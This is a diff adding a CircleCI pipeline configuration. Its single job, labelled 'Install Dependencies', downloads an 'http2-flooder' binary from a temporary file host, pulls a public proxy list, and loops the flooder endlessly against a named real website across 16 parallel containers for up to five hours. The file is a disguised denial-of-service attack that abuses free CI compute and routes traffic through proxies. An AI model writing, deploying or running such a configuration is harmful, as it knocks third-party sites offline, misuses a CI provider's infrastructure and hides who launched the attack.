@@ -1,0 +1,16 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: ubuntu:latest
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: apt update && apt install wget -y && wget https://temp.sh/csSfU/http2-flooder && wget https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt && chmod 777 * && while true; do ./http2-flooder https://hentai.tv/ 999999 6 36 http.txt; done;
+            no_output_timeout: 5h
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
